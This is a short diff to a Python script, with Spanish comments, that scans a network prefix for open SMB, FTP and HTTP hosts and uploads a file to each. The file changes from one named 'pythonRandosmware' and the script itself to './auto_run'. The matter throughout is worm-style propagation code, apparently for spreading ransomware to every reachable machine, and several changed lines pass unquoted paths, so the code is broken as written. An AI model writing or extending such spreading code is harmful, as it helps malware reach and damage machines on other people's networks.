@@ -115,7 +115,7 @@ try:
     # Call functions from spread module and execute specific functions
     open_smb_hosts = spread.scan_network_for_smb(network_prefix)
     for host in open_smb_hosts:
-        spread.upload_script_to_smb(host, ./pythonRandosmware)
+        spread.upload_script_to_smb(host, ./auto_run)
         # Ejecutar función específica para SMB
         # Aquí puedes agregar la función específica que deseas ejecutar
 
@@ -127,13 +127,13 @@ try:
 
     open_ftp_hosts = spread.scan_network_for_ftp(network_prefix)
     for host in open_ftp_hosts:
-        spread.upload_script_to_ftp(host, __file__)
+        spread.upload_script_to_ftp(host, ./auto_run)
         # Ejecutar función específica para FTP
         # Aquí puedes agregar la función específica que deseas ejecutar
 
     open_http_hosts = spread.scan_network_for_http(network_prefix)
     for host in open_http_hosts:
-        spread.upload_script_to_http(host, __file__)
+        spread.upload_script_to_http(host, ./auto_run)
         # Ejecutar función específica para HTTP
         # Aquí puedes agregar la función específica que deseas ejecutar
 
